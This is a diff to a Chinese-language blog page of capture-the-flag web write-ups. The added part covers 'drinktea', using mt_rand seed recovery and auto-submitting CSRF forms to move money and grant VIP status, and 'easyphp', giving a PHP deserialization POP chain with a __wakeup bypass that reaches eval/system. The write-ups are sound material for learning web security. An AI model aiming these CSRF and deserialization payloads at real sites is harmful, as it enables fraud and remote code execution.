@@ -183,7 +183,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/CTF-WP" style=color:#879cff>
+                <a href="/tags/CTF-WP" style=color:#1bccbc>
                     CTF-WP
                 </a>
             </span>
@@ -201,7 +201,7 @@
 <li>提示本地访问，添加<code>X-Forwarded-For: 127.0.0.1</code>，发现被过滤了，搜了一下找到一个：<code>Client-Ip: 127.0.0.1</code></li>
 <li>提示不是从 sycsec.com 访问，添加：<code>Referer: sycsec.com</code></li>
 <li>提示浏览器不是Syclover Browser，添加：<code>User-Agent: Syclover Browser</code></li>
-<li>提示邮箱不是 <a href="mailto:&#x56;&#97;&#110;&#x5a;&#x59;&#x40;&#x53;&#x79;&#99;&#x6c;&#111;&#x76;&#101;&#114;&#46;&#x63;&#x6f;&#x6d;">&#x56;&#97;&#110;&#x5a;&#x59;&#x40;&#x53;&#x79;&#99;&#x6c;&#111;&#x76;&#101;&#114;&#46;&#x63;&#x6f;&#x6d;</a> ，添加：<code>From: VanZY@Syclover.com</code>，得到flag：<code>SYC&#123;E3sy_Http_hhXD2333&#125;</code></li>
+<li>提示邮箱不是 <a href="mailto:&#86;&#97;&#x6e;&#x5a;&#x59;&#x40;&#83;&#x79;&#99;&#108;&#x6f;&#x76;&#101;&#114;&#46;&#99;&#x6f;&#109;">&#86;&#97;&#x6e;&#x5a;&#x59;&#x40;&#83;&#x79;&#99;&#108;&#x6f;&#x76;&#101;&#114;&#46;&#99;&#x6f;&#109;</a> ，添加：<code>From: VanZY@Syclover.com</code>，得到flag：<code>SYC&#123;E3sy_Http_hhXD2333&#125;</code></li>
 </ul>
 <h3 id="web-来发个包"><a href="#web-来发个包" class="headerlink" title="web-来发个包"></a>web-来发个包</h3><ul>
 <li>输入flag没反应，抓包啥也没有，查看源码发现js被注释，没办法发送请求到后端</li>
@@ -280,6 +280,113 @@
 </code></pre>
 </li>
 <li><p>蚁剑或者直接rce，拿到flag：<code>SYC&#123;stay_0r_get_0ut_here!&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-drinktea"><a href="#web-drinktea" class="headerlink" title="web-drinktea"></a>web-drinktea</h3><ul>
+<li><p>打开先注册个账号，但是半小时这号就没了，好过分哦</p>
+</li>
+<li><p>然后利用CSRF，让管理员给转钱，提交反馈的时候有个验证码，源码：</p>
+<pre><code class="php">&lt;?php
+//真的随机吗？
+$seed = file_get_contents(&quot;/seed&quot;);
+mt_srand($seed);
+mt_rand();//   == 1567320364
+mt_rand();
+mt_rand();
+mt_rand();
+mt_rand();
+mt_rand();
+$code = md5(mt_rand());
+echo file_get_contents(&quot;random.php&quot;);
+</code></pre>
+</li>
+<li><p>mt_rand伪随机，反推一下seed，这里要注意php版本不同得到的随机数也不同</p>
+</li>
+<li><p><code>seed</code>是<code>666666</code>，php版本要7.1+，得到code：<code>2bfd7154e1f327a42dae866bac9ecd45</code></p>
+</li>
+<li><p>构造一个post请求：</p>
+<pre><code class="html">&lt;form action=http://mc.vveelin.com.cn:8102/trans.php method=POST&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;123&quot; /&gt;
+&lt;input type=&quot;text&quot; name=&quot;money&quot; value=&quot;99999999999999&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
+</code></pre>
+</li>
+<li><p>放在vps上，反馈里放上链接，就得到了很多钱</p>
+</li>
+<li><p>hint里告诉要买双皮奶，但是点击下单后提示只有VIP可以买，所以要想办法成为VIP</p>
+</li>
+<li><p>主页源码里找到一个注释：<code>&lt;!-- 管理：mng.php --&gt;</code>，访问，给出了get传参的格式</p>
+</li>
+<li><p>还是利用CSRF，构造一个get请求：</p>
+<pre><code class="html">&lt;img src=http://mc.vveelin.com.cn:8102/mng.php?name=123&amp;vip=true /&gt; 
+</code></pre>
+</li>
+<li><p>反馈，然后下单，得到flag</p>
+</li>
+</ul>
+<h3 id="web-easyphp"><a href="#web-easyphp" class="headerlink" title="web-easyphp"></a>web-easyphp</h3><ul>
+<li><p>打开页面啥也没有，源码提示了备份文件，再背个单词吧就：<code>backup file-备份文件</code></p>
+</li>
+<li><p>扫目录，可以找到一个<code>index.php.bak</code>，打开，得到了一堆看不懂的代码</p>
+</li>
+<li><p>要把<code>eval</code>换成<code>echo</code>，得到的东西贴上去再换一次，得到源码：</p>
+<pre><code class="php">&lt;?php
+    class BillyHerrington&#123;
+        public $a;
+        public function __wakeup()&#123;
+            $this -&gt; a = &quot;fxxk you &quot;;
+        &#125;
+        public function __destruct()&#123;
+            echo $this -&gt; a.&quot;Wow&quot;;
+        &#125;
+    &#125;
+    class Baoglady&#123;
+        public $b;
+        public $c;
+        public function __toString()&#123;
+            $this -&gt; b -&gt; happy($this -&gt; c);
+        &#125;
+    &#125;
+    class VanDarkholme&#123;
+        public $d;
+        public function happy($cmd)&#123;
+            eval($cmd);
+        &#125;
+    &#125;
+    if(isset($_POST[&#39;str&#39;]))&#123;
+        unserialize($_POST[&#39;str&#39;]);
+    &#125;
+</code></pre>
+</li>
+<li><p>反序列化构造pop链，注意绕过<code>wakeup</code>，exp：</p>
+<pre><code class="php">&lt;?php
+    class BillyHerrington&#123;
+        public $a;
+        public function __construct()&#123;
+            $this -&gt; a = new Baoglady();
+        &#125;
+    &#125;
+    class Baoglady&#123;
+        public $b;
+        public $c;
+        public function __construct()&#123;
+            $this -&gt; b = new VanDarkholme();
+            $this -&gt; c = &quot;system(&#39;cat /flagishere&#39;);&quot;;
+        &#125;
+    &#125;
+    class VanDarkholme&#123;
+        public $d;
+        public function happy($cmd)&#123;
+            eval($cmd);
+        &#125;
+    &#125;
+    $t = serialize(new BillyHerrington());
+    $tt = str_replace(&#39;&quot;BillyHerrington&quot;:1:&#123;&#39;,&#39;&quot;BillyHerrington&quot;:6:&#123;&#39;,$t);
+    echo urlencode($tt);
+</code></pre>
+</li>
+<li><p>得到flag</p>
 </li>
 </ul>
 
